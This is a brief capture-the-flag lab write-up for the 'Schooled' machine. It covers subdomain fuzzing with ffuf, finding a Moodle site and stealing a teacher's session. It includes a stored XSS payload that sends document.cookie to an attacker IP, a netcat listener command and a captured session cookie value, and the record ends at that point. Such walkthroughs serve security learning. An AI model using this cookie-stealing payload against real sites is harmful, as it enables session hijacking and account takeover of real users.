# Schooled

IP : 10.10.10.234

## nmap 
|Port|service|
|---|---|
|22|ssh|
|80|http|

The website it hosting a site for a school,  lets see if we can find something interresting, lets start with fuzzing sub domains. 

```bash
ffuf -c -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt -u http://schooled.htb -H "Host: FUZZ.schooled.htb" -fw 5338
```

It look like we found moodle a common tools used by schools. lets add that to our hosts file.
Start by creating a account, looking around we see that the only course we can sign yourself up for is math, so lets do that, in here we see a post from Manuel Phillips about setting our MoodleNet.

The post is a hint to use the moodleNet as our exploit, 
lets try doing some xss.

````
<script>new Image().src="http://10.10.14.200/bogus.php?output="+document.cookie;</script>

````

Start netcat listner.
```bash
nc -lnvp 80
```

After a few miniutes we get the session key. 
MoodleSession=tvarc4lrpk50rfjkpbkvoev4j8 